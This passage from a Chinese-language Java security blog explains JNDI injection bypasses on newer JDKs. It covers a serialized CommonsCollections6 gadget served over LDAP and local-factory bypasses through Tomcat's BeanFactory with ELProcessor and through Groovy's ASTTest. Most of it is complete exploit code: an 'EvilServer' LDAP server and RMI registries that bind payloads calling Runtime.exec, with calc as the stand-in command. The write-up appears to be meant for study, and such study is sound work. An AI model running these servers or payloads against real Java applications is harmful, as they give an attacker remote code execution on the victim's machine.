com.sun.jndi.ldap.object.trustURLCodebase属性的默认值同样被修改为了false，即默认不允许通过LDAP从远程的Codebase加载Reference工厂类</p><h3 id="LDAP本地Gadget绕过"><a href="#LDAP本地Gadget绕过" class="headerlink" title="LDAP本地Gadget绕过"></a>LDAP本地Gadget绕过</h3><p>LDAP服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象：</p><p>JNDI在完成lookup后会调用obj.decodeObject：</p><p><img src="/archives/be65d471/image-20250721150257467-17530813788865.png" alt="image-20250721150257467"></p><p>首先判断JAVA_ATTRIBUTES[SERIALIZED_DATA],也就是javaSerializedData是否为空</p><p>不为空就会调用deserializeObject方法：</p><p><img src="/archives/be65d471/image-20250721150333601.png" alt="image-20250721150333601"></p><p>这里的deserial就是从javaSerializedData获取的序列化数据</p><p>那么对象可以是我们传入恶意的序列化数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CC6的序列化对象数据)</span><br></pre></td></tr></table></figure><p>EvilServer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:5432/#CC6&quot;</span>&#125;;  <span class="comment">//恶意对象下载地址</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;  <span class="comment">//LDAP服务端口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置LDAP服务器</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加恶意拦截器</span></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//启动服务</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;    <span class="comment">//恶意代码地址</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);  <span class="comment">//发送恶意响应</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="comment">// 构造 class 文件实际路径 (将 #EvilObject 转换为 /EvilObject.class)</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//任意类名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构建恶意 LDAP 条目</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  <span class="comment">//代码库地址 (http://127.0.0.1:5432/)</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  <span class="comment">//工厂类名（EvilObject）</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CC6());</span><br><span class="line">            result.sendSearchEntry(e);  <span class="comment">//发送给客户端</span></span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] CC6() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line">            Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            Map Lazymap=LazyMap.decorate(innermap, chain);</span><br><span class="line">            TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">            HashSet map=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">            map.add(tiedMapEntry);</span><br><span class="line">            innermap.remove(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(map);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250721151917060.png" alt="image-20250721151917060"></p><p>客户端发起请求能弹计算机</p><h3 id="加载本地工厂绕过"><a href="#加载本地工厂绕过" class="headerlink" title="加载本地工厂绕过"></a>加载本地工厂绕过</h3><p>环境：jdk 8u192</p><p>使用 jdk 高版本的时，即使在传入时候设置了 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 为 true，也会报错，调试时发现该值依然为 false</p><p>既然远程加载不行，那么我们是否可以通过本地加载<code>Reference Factory</code>呢？</p><p><img src="/archives/be65d471/image-20250721143037710.png" alt="image-20250721143037710"></p><p>这里我们需要确定加载哪个工厂，工厂需要实现javax.naming.spi.ObjectFactory接口，还需要重写getObjectInstance方法，因为在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>最后的<code>return</code>语句对Factory类的实例对象进行了类型转换</p><h4 id="Tomcat8绕过"><a href="#Tomcat8绕过" class="headerlink" title="Tomcat8绕过"></a>Tomcat8绕过</h4><p>其中<code>org.apache.naming.factory.BeanFactory</code>恰好满足这些特点，且该类存在于Tomcat8依赖包中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//声明将 faster 属性映射到 eval() 方法</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//注入 EL 表达式</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)&quot;</span>)); </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;b1uel0n3&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>forceString用于声明属性与方法之间的强制映射关系，当设置 <code>faster</code> 属性时，实际调用 <code>eval()</code> 方法</p></blockquote><p><img src="/archives/be65d471/image-20250721105208427.png" alt="image-20250721105208427"></p><p>跟进源码分析：</p><p><img src="/archives/be65d471/image-20250721105817727.png" alt="image-20250721105817727"></p><p><img src="/archives/be65d471/image-20250721110001056.png" alt="image-20250721110001056"></p><p>lookup最后会调用工厂的getObjectInstance方法，简单看看这个类的getObjectInstance方法：</p><p><img src="/archives/be65d471/image-20250721110040917-17530668420671.png" alt="image-20250721110040917"></p><p>先判断ref是否为ResourceRef类</p><p>通过反射实例化Reference所指向的任意BeanClass：</p><p><img src="/archives/be65d471/image-20250721110356055.png" alt="image-20250721110356055"></p><p><img src="/archives/be65d471/image-20250721110448074.png" alt="image-20250721110448074"></p><p>然后通过反射获取setter方法再执行：</p><p><img src="/archives/be65d471/image-20250721111420634.png" alt="image-20250721111420634"></p><p><img src="/archives/be65d471/image-20250721112434641.png" alt="image-20250721112434641"></p><p>通过实例化我们指定的javax.el.ELProcessor对象，forceString可以给属性强制指定一个setter方法，这里将属性faster的setterName设置为了<code>public java.lang.Object javax.el.ELProcessor.eval()</code>，接着传入faster的setter的参数，也就是<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code>。接着运行setter，实际上就相当于运行<code>java.lang.Object javax.el.ELProcessor.eval(Runtime.getRuntime().exec(&quot;calc.exe&quot;))</code>。</p><h4 id="Groovy绕过"><a href="#Groovy绕过" class="headerlink" title="Groovy绕过"></a>Groovy绕过</h4><p>在Groovy中，Groovy程序允许我们执行断言，也就意味着命令执行</p><blockquote><p><strong>断言（Assertion）</strong> 是编程中用于验证程序执行结果是否符合预期的机制。它本质上是一种<strong>声明式检查</strong></p></blockquote><p><code>@ASTTest</code>是一种特殊的AST转换，编译器的调试工具，它会在编译期对AST执行断言，而不是对编译结果执行断言。这意味着此AST转换在生成字节码之前可以访问AST。<code>@ASTTest</code>可以放置在任何可注释节点上</p><p><img src="/archives/be65d471/20211215144919-20b51e3e-5d73-1.png"></p><p>它的思路和Tomcat相似，借助BeanFactory的功能，使程序执行<code>GroovyClassLoader#parseClass</code>，然后去解析groovy脚本</p><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;groovy&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.4</span><span class="number">.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>EvilObject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=parseClass&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>,script));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;b1uel0n3&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/be65d471/image-20250721114332928.png" alt="image-20250721114332928"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#jndi--rmi">https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#jndi--rmi</a></p><p><a href="https://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a#2d7bc602aaaa410696acd32cbbc182fd">https://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a#2d7bc602aaaa410696acd32cbbc182fd</a></p><p><a href="https://xz.aliyun.com/news/6860">https://xz.aliyun.com/news/6860</a></p><p><a href="https://www.cnblogs.com/erosion2020/p/18561646">https://www.cnblogs.com/erosion2020/p/18561646</a></p><p><a href="https://xz.aliyun.com/news/10119">https://xz.aliyun.com/news/10119</a></p><p><a href="https://sanshiok.com/archive/30.html#JNDI-1">https://sanshiok.com/archive/30.html#JNDI-1</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> Java基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CB利用链深度解析</title>
      <link href="/archives/df850557/"/>
      <url>/archives/df850557/</url>
      
